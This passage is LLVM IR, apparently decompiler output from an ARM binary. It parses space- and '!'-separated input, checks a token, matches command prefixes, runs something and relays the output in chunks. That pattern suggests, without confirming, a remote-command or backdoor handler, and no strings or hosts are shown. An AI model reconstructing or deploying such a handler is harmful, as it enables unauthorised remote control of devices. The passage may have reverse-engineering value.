  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-2144 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 45640, i32* %stack_var_-4, align 4
  %v2_b244 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b244, i32* @fp, align 4
  br label %dec_label_pc_b274

dec_label_pc_b268:                                ; preds = %dec_label_pc_b28c
  %v1_b26c = add i32 %storemerge8, 1
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b23c, %dec_label_pc_b268
  %storemerge8 = phi i32 [ 0, %dec_label_pc_b23c ], [ %v1_b26c, %dec_label_pc_b268 ]
  store i32 %arg3, i32* @r0, align 4
  %v0_b27c = call i32 @function_f670()
  store i32 %v0_b27c, i32* %r0.global-to-local, align 4
  %v3_b284 = icmp ult i32 %storemerge8, %v0_b27c
  br i1 %v3_b284, label %dec_label_pc_b28c, label %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge

dec_label_pc_b274.dec_label_pc_b2a8_crit_edge:    ; preds = %dec_label_pc_b274
  %.pre = add i32 %storemerge8, %arg3
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_b2a8

dec_label_pc_b28c:                                ; preds = %dec_label_pc_b274
  %v2_b298 = add i32 %storemerge8, %arg3
  %v1_b29c = inttoptr i32 %v2_b298 to i8*
  %v2_b29c = load i8, i8* %v1_b29c, align 1
  %v7_b2a0 = icmp eq i8 %v2_b29c, 32
  br i1 %v7_b2a0, label %dec_label_pc_b2a8, label %dec_label_pc_b268

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b28c, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge
  %v3_b2bc.pre-phi = phi i8* [ %.pre24, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge ], [ %v1_b29c, %dec_label_pc_b28c ]
  %v2_b2b4.pre-phi = phi i32 [ %.pre, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge ], [ %v2_b298, %dec_label_pc_b28c ]
  store i8 0, i8* %v3_b2bc.pre-phi, align 1
  %v1_b2d8 = add i32 %v2_b2b4.pre-phi, 2
  %v5_b2dc = inttoptr i32 %v1_b2d8 to i8*
  br label %dec_label_pc_b2f8

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b310
  %v1_b2f0 = add i32 %storemerge9, 1
  br label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b2a8, %dec_label_pc_b2ec
  %storemerge9 = phi i32 [ 0, %dec_label_pc_b2a8 ], [ %v1_b2f0, %dec_label_pc_b2ec ]
  store i32 %storemerge9, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_b300 = call i32 @function_f670()
  store i32 %v0_b300, i32* %r0.global-to-local, align 4
  %v0_b308 = load i32, i32* @r4, align 4
  %v3_b308 = icmp ult i32 %v0_b308, %v0_b300
  br i1 %v3_b308, label %dec_label_pc_b310, label %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge

dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge:    ; preds = %dec_label_pc_b2f8
  %.pre25 = add i32 %storemerge9, %arg2
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_b32c

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2f8
  %v2_b31c = add i32 %storemerge9, %arg2
  %v1_b320 = inttoptr i32 %v2_b31c to i8*
  %v2_b320 = load i8, i8* %v1_b320, align 1
  %v7_b324 = icmp eq i8 %v2_b320, 33
  br i1 %v7_b324, label %dec_label_pc_b32c, label %dec_label_pc_b2ec

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b310, %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge
  %v3_b340.pre-phi = phi i8* [ %.pre26, %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge ], [ %v1_b320, %dec_label_pc_b310 ]
  store i8 0, i8* %v3_b340.pre-phi, align 1
  %v2_b348 = load i8, i8* %v5_b2dc, align 1
  %v7_b34c = icmp eq i8 %v2_b348, 33
  br i1 %v7_b34c, label %dec_label_pc_b354, label %dec_label_pc_b8f8

dec_label_pc_b354:                                ; preds = %dec_label_pc_b32c
  %v2_b358 = load i32, i32* @global_var_25ab0.173, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_b364 = inttoptr i32 %arg3 to i8*
  %v3_b364 = call i32 @function_fa14(i8* %v2_b364, i32 %v2_b358)
  store i32 %v3_b364, i32* %r0.global-to-local, align 4
  %v2_b36c = icmp eq i32 %v3_b364, 0
  br i1 %v2_b36c, label %dec_label_pc_b374, label %dec_label_pc_b8f8

dec_label_pc_b374:                                ; preds = %dec_label_pc_b354
  %v2_b37c = ptrtoint i32* %stack_var_-1120 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_b37c, i32* %r0.global-to-local, align 4
  %v2_b38c = bitcast i32* %stack_var_-1120 to i8*
  %v3_b38c = call i32 @function_f5d0(i8* %v2_b38c, i32 0)
  store i32 %v3_b38c, i32* %r0.global-to-local, align 4
  %v1_b39c = add i32 %v2_b2b4.pre-phi, 3
  %v5_b3a0 = inttoptr i32 %v1_b39c to i8*
  br label %dec_label_pc_b3bc

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b3d4
  %v1_b3b4 = add i32 %storemerge10, 1
  br label %dec_label_pc_b3bc

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b374, %dec_label_pc_b3b0
  %storemerge10 = phi i32 [ 0, %dec_label_pc_b374 ], [ %v1_b3b4, %dec_label_pc_b3b0 ]
  store i32 %storemerge10, i32* @r4, align 4
  store i32 %v1_b39c, i32* @r0, align 4
  %v0_b3c4 = call i32 @function_f670()
  store i32 %v0_b3c4, i32* %r0.global-to-local, align 4
  %v0_b3cc = load i32, i32* @r4, align 4
  %v3_b3cc = icmp ult i32 %v0_b3cc, %v0_b3c4
  br i1 %v3_b3cc, label %dec_label_pc_b3d4, label %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge

dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge:    ; preds = %dec_label_pc_b3bc
  %.pre27 = add i32 %storemerge10, %v1_b39c
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_b3f0

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b3bc
  %v2_b3e0 = add i32 %storemerge10, %v1_b39c
  %v1_b3e4 = inttoptr i32 %v2_b3e0 to i8*
  %v2_b3e4 = load i8, i8* %v1_b3e4, align 1
  %v7_b3e8 = icmp eq i8 %v2_b3e4, 32
  br i1 %v7_b3e8, label %dec_label_pc_b3f0, label %dec_label_pc_b3b0

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3d4, %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge
  %v3_b404.pre-phi = phi i8* [ %.pre28, %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge ], [ %v1_b3e4, %dec_label_pc_b3d4 ]
  store i8 0, i8* %v3_b404.pre-phi, align 1
  %v2_b40c = load i32, i32* @global_var_2599c.175, align 4
  store i32 %v1_b39c, i32* %r0.global-to-local, align 4
  %v3_b418 = call i32 @function_81ec(i8* %v5_b3a0, i32 %v2_b40c)
  store i32 %v3_b418, i32* %r0.global-to-local, align 4
  %v2_b420 = icmp eq i32 %v3_b418, 0
  br i1 %v2_b420, label %dec_label_pc_b428, label %dec_label_pc_b8f8

dec_label_pc_b428:                                ; preds = %dec_label_pc_b3f0
  %v1_b42c = add i32 %v2_b2b4.pre-phi, 4
  %v2_b434 = add i32 %v1_b42c, %storemerge10
  %v5_b438 = inttoptr i32 %v2_b434 to i8*
  store i32 %v2_b434, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_195f4.177 to i32), i32* @r1, align 4
  %v5_b448 = call i32 @function_f7dc(i8* %v5_b438, i32 ptrtoint ([5 x i8]* @global_var_195f4.177 to i32), i32 4)
  store i32 %v5_b448, i32* %r0.global-to-local, align 4
  %v2_b450 = icmp eq i32 %v5_b448, 0
  br i1 %v2_b450, label %dec_label_pc_b458, label %dec_label_pc_b494

dec_label_pc_b458:                                ; preds = %dec_label_pc_b428
  %v2_b45c = load i8, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  %v2_b460 = icmp eq i8 %v2_b45c, 0
  br i1 %v2_b460, label %dec_label_pc_b47c, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b458
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_b474 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_188a0.12 to i32))
  store i32 %v3_b474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b494

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b458
  %v1_b480 = add i32 %v2_b434, 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v1_b480, i32* @r2, align 4
  %v3_b490 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_195fc.181 to i32))
  store i32 %v3_b490, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b494

dec_label_pc_b494:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b468, %dec_label_pc_b47c
  store i32 %v2_b434, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19600.183 to i32), i32* @r1, align 4
  %v5_b4a0 = call i32 @function_f7dc(i8* %v5_b438, i32 ptrtoint ([4 x i8]* @global_var_19600.183 to i32), i32 3)
  store i32 %v5_b4a0, i32* %r0.global-to-local, align 4
  %v2_b4a8 = icmp eq i32 %v5_b4a0, 0
  br i1 %v2_b4a8, label %dec_label_pc_b4b0, label %dec_label_pc_b5a4

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b494
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_b4b4 = call i32 @function_8400(i32 %arg2)
  store i32 %v1_b4b4, i32* %r0.global-to-local, align 4
  %v2_b4bc = icmp eq i32 %v1_b4b4, 0
  br i1 %v2_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b8f8

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b0
  %v2_b4cc = ptrtoint i32* %stack_var_-2144 to i32
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b4dc = bitcast i32* %stack_var_-2144 to i8*
  %v3_b4dc = call i32 @function_f5d0(i8* %v2_b4dc, i32 0)
  %v1_b4e4 = add i32 %v2_b434, 3
  store i32 %v2_b4cc, i32* @r0, align 4
  %v5_b4fc = call i32 @function_d300(i32 %v2_b4cc, i32 ptrtoint ([60 x i8]* @global_var_19604.185 to i32), i32 %v1_b4e4, i32 %v2_b4cc)
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  %v3_b514 = call i32 @function_d520(i32 %v2_b4cc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_188d0.25, i32 0, i32 0))
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v1_b584 = inttoptr i32 %v3_b514 to i16*
  %v2_b58421 = call i32 @function_eca4(i16* %v1_b584)
  store i32 %v2_b58421, i32* %r0.global-to-local, align 4
  %v2_b58c23 = icmp eq i32 %v2_b58421, 0
  br i1 %v2_b58c23, label %dec_label_pc_b524, label %dec_label_pc_b594

dec_label_pc_b524:                                ; preds = %dec_label_pc_b4c4, %dec_label_pc_b524
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v3_b53c = call i32 @function_f5d0(i8* %v2_b4dc, i32 0)
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  %v3_b558 = call i32 @function_ed48(i32 %v2_b4cc, i32 1024, i32 %v3_b514)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_b574 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_19640.188 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_b57c = call i32 @function_11ca8(i32 1)
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v2_b584 = call i32 @function_eca4(i16* %v1_b584)
  store i32 %v2_b584, i32* %r0.global-to-local, align 4
  %v2_b58c = icmp eq i32 %v2_b584, 0
  br i1 %v2_b58c, label %dec_label_pc_b524, label %dec_label_pc_b594

dec_label_pc_b594:                                ; preds = %dec_label_pc_b524, %dec_label_pc_b4c4
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v1_b598 = call i32 @function_d3e8(i32 %v3_b514)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b5a0 = call i32 @function_11bf0(i32 0)
  store i32 %v1_b5a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %dec_label_pc_b494, %dec_label_pc_b594
  store i32 %v2_b434, i32* @r0, align 4
  %v0_b5a8 = call i32 @function_f670()
  store i32 %v0_b5a8, i32* %r0.global-to-local, align 4
  %v2_b5f4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b5f8 = add i32 %v2_b5f4, -1096
  br label %dec_label_pc_b620

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b620
  %v2_b5c4 = load i8, i8* %stack_var_-40.0, align 1
  %v7_b5c8 = icmp eq i8 %v2_b5c4, 32
  br i1 %v7_b5c8, label %dec_label_pc_b670, label %dec_label_pc_b5d0

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5c0
  %v2_b5d4 = load i8, i8* %stack_var_-40.0, align 1
  %v2_b5d8 = icmp eq i8 %v2_b5d4, 0
  br i1 %v2_b5d8, label %dec_label_pc_b670, label %dec_label_pc_b5e0

dec_label_pc_b5e0:                                ; preds = %dec_label_pc_b5d0
  %v2_b5e8 = load i8, i8* %stack_var_-40.0, align 1
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b5fc = add i32 %v2_b5f8, %storemerge11
  %v3_b604 = inttoptr i32 %v2_b5fc to i8*
  store i8 %v2_b5e8, i8* %v3_b604, align 1
  %v1_b60c = add i32 %v4_b5c0, 1
  %v5_b610 = inttoptr i32 %v1_b60c to i8*
  %v1_b618 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_b620

dec_label_pc_b620:                                ; preds = %dec_label_pc_b5a4, %dec_label_pc_b5e0
  %stack_var_-40.0 = phi i8* [ %v5_b438, %dec_label_pc_b5a4 ], [ %v5_b610, %dec_label_pc_b5e0 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_b5a4 ], [ %v1_b618, %dec_label_pc_b5e0 ]
  %v5_b62c = icmp slt i32 %storemerge11, %v0_b5a8
  %v4_b5c0 = ptrtoint i8* %stack_var_-40.0 to i32
  br i1 %v5_b62c, label %dec_label_pc_b5c0, label %dec_label_pc_b670

dec_label_pc_b63c:                                ; preds = %dec_label_pc_b670
  %v2_b648 = add i32 %storemerge12, %v4_b5c0
  %v1_b64c = inttoptr i32 %v2_b648 to i8*
  %v2_b64c = load i8, i8* %v1_b64c, align 1
  %v7_b650 = icmp eq i8 %v2_b64c, 32
  br i1 %v7_b650, label %dec_label_pc_b658, label %dec_label_pc_b664

dec_label_pc_b658:                                ; preds = %dec_label_pc_b63c
  %v1_b65c = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_b664

dec_label_pc_b664:                                ; preds = %dec_label_pc_b63c, %dec_label_pc_b658
  %stack_var_-36.0 = phi i32 [ %v1_b65c, %dec_label_pc_b658 ], [ %stack_var_-36.1, %dec_label_pc_b63c ]
  %v1_b668 = add i32 %storemerge12, 1
  br label %dec_label_pc_b670

dec_label_pc_b670:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b5d0, %dec_label_pc_b620, %dec_label_pc_b664
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_b664 ], [ 0, %dec_label_pc_b620 ], [ 0, %dec_label_pc_b5d0 ], [ 0, %dec_label_pc_b5c0 ]
  %storemerge12 = phi i32 [ %v1_b668, %dec_label_pc_b664 ], [ 0, %dec_label_pc_b620 ], [ 0, %dec_label_pc_b5d0 ], [ 0, %dec_label_pc_b5c0 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %v4_b5c0, i32* @r0, align 4
  %v0_b678 = call i32 @function_f670()
  store i32 %v0_b678, i32* %r0.global-to-local, align 4
  %v0_b680 = load i32, i32* @r4, align 4
  %v3_b680 = icmp ult i32 %v0_b680, %v0_b678
  br i1 %v3_b680, label %dec_label_pc_b63c, label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b670
  %v1_b68c = add i32 %stack_var_-36.1, 1
  %v7_b69c = icmp slt i32 %v1_b68c, 11
  br i1 %v7_b69c, label %dec_label_pc_b6a8, label %dec_label_pc_b6a0

dec_label_pc_b6a0:                                ; preds = %dec_label_pc_b688
  br label %dec_label_pc_b6a8

dec_label_pc_b6a8:                                ; preds = %dec_label_pc_b688, %dec_label_pc_b6a0
  %stack_var_-36.2 = phi i32 [ %v1_b68c, %dec_label_pc_b688 ], [ 10, %dec_label_pc_b6a0 ]
  %tmp = mul i32 %stack_var_-36.2, 4
  %v3_b6c4 = add i32 %tmp, 4
  %v2_b6cc = add i32 %v2_b5f4, -72
  %v2_b6d0 = add i32 %v2_b6cc, %v3_b6c4
  %v2_b6d8 = inttoptr i32 %v2_b6d0 to i32*
  store i32 ptrtoint (i32* @global_var_19650.190 to i32), i32* %v2_b6d8, align 4
  %v2_b80016 = load i8, i8* %stack_var_-40.0, align 1
  %v2_b80418 = icmp eq i8 %v2_b80016, 0
  br i1 %v2_b80418, label %dec_label_pc_b80c, label %dec_label_pc_b6e8

dec_label_pc_b6e8:                                ; preds = %dec_label_pc_b6a8, %dec_label_pc_b750
  %v4_b7fc20 = phi i32 [ %v2_b7f4.pre-phi, %dec_label_pc_b750 ], [ %v4_b5c0, %dec_label_pc_b6a8 ]
  %stack_var_-32.019 = phi i32 [ %v1_b7e0, %dec_label_pc_b750 ], [ 1, %dec_label_pc_b6a8 ]
  %v1_b6ec = add i32 %v4_b7fc20, 1
  %v6_b700 = icmp slt i32 %stack_var_-32.019, %stack_var_-36.2
  br i1 %v6_b700, label %dec_label_pc_b71c, label %dec_label_pc_b80c

dec_label_pc_b710:                                ; preds = %dec_label_pc_b734
  %v1_b714 = add i32 %storemerge14, 1
  br label %dec_label_pc_b71c

dec_label_pc_b71c:                                ; preds = %dec_label_pc_b6e8, %dec_label_pc_b710
  %storemerge14 = phi i32 [ %v1_b714, %dec_label_pc_b710 ], [ 0, %dec_label_pc_b6e8 ]
  store i32 %v1_b6ec, i32* @r0, align 4
  %v0_b724 = call i32 @function_f670()
  store i32 %v0_b724, i32* %r0.global-to-local, align 4
  %v3_b72c = icmp ult i32 %storemerge14, %v0_b724
  br i1 %v3_b72c, label %dec_label_pc_b734, label %dec_label_pc_b71c.dec_label_pc_b750_crit_edge

dec_label_pc_b71c.dec_label_pc_b750_crit_edge:    ; preds = %dec_label_pc_b71c
  %.pre30 = add i32 %storemerge14, %v1_b6ec
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_b750

dec_label_pc_b734:                                ; preds = %dec_label_pc_b71c
  %v2_b740 = add i32 %storemerge14, %v1_b6ec
  %v1_b744 = inttoptr i32 %v2_b740 to i8*
  %v2_b744 = load i8, i8* %v1_b744, align 1
  %v7_b748 = icmp eq i8 %v2_b744, 32
  br i1 %v7_b748, label %dec_label_pc_b750, label %dec_label_pc_b710

dec_label_pc_b750:                                ; preds = %dec_label_pc_b734, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge
  %v5_b7f8.pre-phi = phi i8* [ %.pre31, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge ], [ %v1_b744, %dec_label_pc_b734 ]
  %v2_b7f4.pre-phi = phi i32 [ %.pre30, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge ], [ %v2_b740, %dec_label_pc_b734 ]
  store i32 %stack_var_-32.019, i32* @r4, align 4
  %v1_b758 = add i32 %storemerge14, 1
  store i32 %v1_b758, i32* %r0.global-to-local, align 4
  %v1_b760 = call i32 @function_10110(i32 %v1_b758)
  %v0_b770 = load i32, i32* @r4, align 4
  %v3_b770 = mul i32 %v0_b770, 4
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b77c = add i32 %v2_b6cc, %v3_b770
  %v2_b780 = inttoptr i32 %v2_b77c to i32*
  store i32 %v1_b760, i32* %v2_b780, align 4
  %v3_b78c = mul i32 %stack_var_-32.019, 4
  %v2_b798 = add i32 %v2_b6cc, %v3_b78c
  %v1_b79c = inttoptr i32 %v2_b798 to i32*
  %v2_b79c = load i32, i32* %v1_b79c, align 4
  store i32 %v2_b79c, i32* %r0.global-to-local, align 4
  store i32 %v1_b6ec, i32* @r1, align 4
  %v3_b7ac = call i32 @function_f910(i32 %v2_b79c, i32 %v1_b6ec, i32 %storemerge14)
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b7c8 = load i32, i32* %v1_b79c, align 4
  %v2_b7d0 = add i32 %v2_b7c8, %storemerge14
  %v3_b7d8 = inttoptr i32 %v2_b7d0 to i8*
  store i8 0, i8* %v3_b7d8, align 1
  %v1_b7e0 = add nuw i32 %stack_var_-32.019, 1
  %v2_b800 = load i8, i8* %v5_b7f8.pre-phi, align 1
  %v2_b804 = icmp eq i8 %v2_b800, 0
  br i1 %v2_b804, label %dec_label_pc_b80c, label %dec_label_pc_b6e8

dec_label_pc_b80c:                                ; preds = %dec_label_pc_b750, %dec_label_pc_b6e8, %dec_label_pc_b6a8
  %v7_b8ec = load i32, i32* inttoptr (i32 143104 to i32*), align 256
  %v2_b8f0 = icmp eq i32 %v7_b8ec, 0
  br i1 %v2_b8f0, label %dec_label_pc_b8f8, label %dec_label_pc_b818

dec_label_pc_b818:                                ; preds = %dec_label_pc_b80c
  %v7_b820 = load i32, i32* inttoptr (i32 143104 to i32*), align 256
  store i32 %v7_b820, i32* %r0.global-to-local, align 4
  %v2_b838 = inttoptr i32 %v7_b820 to i8*
  %v3_b838 = call i32 @function_fa14(i8* %v2_b838, i32 %v2_b37c)
  store i32 %v3_b838, i32* %r0.global-to-local, align 4
  %v2_b860 = load i32, i32* inttoptr (i32 143108 to i32*), align 4
  store i32 %v2_b860, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 47240, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_b860)
  %v5_b8d070 = icmp sgt i32 %stack_var_-36.2, 1
  br i1 %v5_b8d070, label %dec_label_pc_b894, label %dec_label_pc_b8f8

dec_label_pc_b894:                                ; preds = %dec_label_pc_b818, %dec_label_pc_b894
  %storemerge1371 = phi i32 [ %v1_b8bc, %dec_label_pc_b894 ], [ 1, %dec_label_pc_b818 ]
  %v3_b89c = mul i32 %storemerge1371, 4
  %v2_b8a8 = add i32 %v2_b6cc, %v3_b89c
  %v1_b8ac = inttoptr i32 %v2_b8a8 to i32*
  %v2_b8ac = load i32, i32* %v1_b8ac, align 4
  store i32 %v2_b8ac, i32* @r0, align 4
  %v0_b8b4 = call i32 @function_11048()
  store i32 %v0_b8b4, i32* %r0.global-to-local, align 4
  %v1_b8bc = add nuw nsw i32 %storemerge1371, 1
  %v5_b8d0 = icmp slt i32 %v1_b8bc, %stack_var_-36.2
  br i1 %v5_b8d0, label %dec_label_pc_b894, label %dec_label_pc_b8f8

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b818, %dec_label_pc_b894, %dec_label_pc_b80c, %dec_label_pc_b4b0, %dec_label_pc_b3f0, %dec_label_pc_b354, %dec_label_pc_b32c
  %v1_b900 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_b900

; uselistorder directives
  uselistorder i32 %v1_b8bc, { 1, 0 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_b6ec, { 2, 3, 0, 1, 4 }
  uselistorder i32 %stack_var_-32.019, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-36.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 0, 1 }
  uselistorder i32 %stack_var_-36.1, { 0, 2, 1 }
  uselistorder i32 %v4_b5c0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i8* %stack_var_-40.0, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v2_b5f4, { 2, 1, 0, 4, 3 }
  uselistorder i16* %v1_b584, { 1, 0 }
  uselistorder i32 %v3_b514, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_b4cc, { 1, 0, 2, 4, 3, 7, 6, 5, 8 }
  uselistorder i32 %v2_b434, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 %storemerge10, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_b39c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 42, 3, 2, 6, 4, 5, 7, 8, 9, 10, 12, 11, 18, 19, 21, 20, 45, 26, 22, 23, 24, 25, 14, 13, 27, 28, 17, 29, 32, 30, 15, 31, 34, 33, 36, 35, 16, 37, 38, 40, 39, 1, 41, 43, 44, 0 }
  uselistorder i32 (i32)* @function_8400, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_2323c.8 to i8*), { 5, 0, 4, 1, 3, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_f7dc, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32)* @function_81ec, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg2, { 3, 5, 4, 2, 0, 1, 6 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 1, 0, 7 }
  uselistorder label %dec_label_pc_b8f8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b71c, { 1, 0 }
  uselistorder label %dec_label_pc_b6e8, { 1, 0 }
  uselistorder label %dec_label_pc_b6a8, { 1, 0 }
  uselistorder label %dec_label_pc_b670, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b664, { 1, 0 }
  uselistorder label %dec_label_pc_b620, { 1, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b524, { 1, 0 }
  uselistorder label %dec_label_pc_b494, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3bc, { 1, 0 }
  uselistorder label %dec_label_pc_b2f8, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 1, 0 }
}

define i32 @function_b930(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b930:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_b930 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b930, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_b930
  %v1_b930 = load i32, i32* %r2.global-to-local, align 4
  %v5_b930 = mul i32 %arg1, 1073741824
  %v6_b930 = and i32 %v1_b930, %v5_b930
  store i32 %v6_b930, i32* %r2.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_b930, %bb
  store i32 47424, i32* %stack_var_-4, align 4
  %v2_b93c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b93c, i32* @fp, align 4
  %v2_b954 = load i32, i32* @global_var_2599c.175, align 4
  store i32 %v2_b954, i32* @r2, align 4
  %v3_b964 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_19654.194 to i32))
  %v2_b96c = load i32, i32* @global_var_25ab0.173, align 4
  store i32 %v2_b96c, i32* @r2, align 4
  %v3_b980 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_19664.199 to i32))
  %v2_b988 = load i32, i32* @global_var_2599c.175, align 4
  store i32 %v2_b988, i32* @r2, align 4
  %v3_b998 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_19674.201 to i32))
  ret i32 %v3_b998

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 3, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_b9c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b9c0:
  %stack_var_-4 = alloca i32, align 4
  store i32 47564, i32* %stack_var_-4, align 4
  %v2_b9c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b9c8, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b9e8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1967c.203 to i32))
  ret i32 %v3_b9e8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

